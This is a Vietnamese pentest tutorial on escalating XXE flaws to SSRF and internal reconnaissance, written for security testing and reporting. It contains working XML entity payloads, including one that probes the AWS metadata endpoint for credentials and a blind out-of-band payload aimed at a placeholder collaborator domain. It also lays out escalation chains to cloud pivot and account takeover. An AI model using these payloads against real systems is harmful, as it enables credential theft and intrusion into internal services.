# XXE Sang SSRF và Internal Recon

## Vì Sao XXE Có Thể Trở Thành SSRF

External entity có thể trỏ đến URL thay vì file local. Khi parser resolve URL đó, ứng dụng sẽ gửi request thay attacker từ bối cảnh mạng của server.

Điều này biến XXE thành SSRF primitive rất mạnh.

## Mẫu Payload SSRF Cốt Lõi

```xml
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "http://internal.service.local/health">
]>
<root><id>&xxe;</id></root>
```

Nếu response được reflect, attacker có thể đọc kết quả request nội bộ ngay trên response.

## Mục Tiêu SSRF Giá Trị Cao

| Nhóm dịch vụ                 | Mục tiêu                                 |
| ---------------------------- | ---------------------------------------- |
| Metadata cloud               | Lấy token/instance profile credentials   |
| Bảng quản trị nội bộ         | Phát hiện endpoint không expose internet |
| API khám phá dịch vụ         | Recon topology hệ thống                  |
| Endpoint giám sát/điều khiển | Kích hoạt hành vi backend                |

### Ví Dụ Probe Metadata Cloud (Kiểu AWS)

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<foo>&xxe;</foo>
```

## Phát Hiện Blind SSRF

Khi không có reflection:

1. Trỏ entity đến collaborator domain.
2. Theo dõi DNS lookup + HTTP request.
3. Nếu bị chặn entity thường, dùng parameter entity.

```xml
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://COLLABORATOR_DOMAIN">
  %xxe;
]>
<foo>1</foo>
```

## Quy Trình Trinh Sát Qua XXE-SSRF

```text
1. Xác minh khả năng outbound (OOB hit)
2. Liệt kê hostname/IP nội bộ theo phạm vi
3. Probe đường dẫn phổ biến (/health, /metrics, /admin)
4. Nhận diện dịch vụ từ header/nội dung/lỗi/thời gian
5. Ưu tiên đường dẫn có khả năng trả secret/token
```

## Ràng Buộc và Lưu Ý

- Egress filtering có thể chặn HTTP/FTP, nhưng DNS vẫn có thể đi.
- Parser có thể chỉ cho phép một số giao thức.
- Timeout ngắn có thể che giấu kết quả, cần tối ưu payload và retry.
- Không nên scan nội bộ vô hạn trong pentest thực tế nếu không có phép rõ ràng.

## Ví Dụ Chuỗi Leo Thang Tác Động

- XXE -> SSRF metadata -> temporary credentials -> cloud pivot
- XXE -> SSRF internal API -> lấy config/secret -> account takeover
- XXE -> SSRF đến management endpoint -> thay đổi trạng thái hệ thống

## Hướng Dẫn Ghi Báo Cáo

Khi báo cáo, cần ghi rõ:

- Endpoint parse XML bị lỗi
- Payload đã dùng
- Dịch vụ nội bộ đã truy cập được
- Bằng chứng OOB và/hoặc reflected response
- Mức độ rủi ro kinh doanh từ pivot chain

## Tệp Liên Quan

- [04-exploitation-workflow.md](04-exploitation-workflow.md)
- [07-blind-xxe-and-oob-exfiltration.md](07-blind-xxe-and-oob-exfiltration.md)
- [08-hidden-attack-surface.md](08-hidden-attack-surface.md)
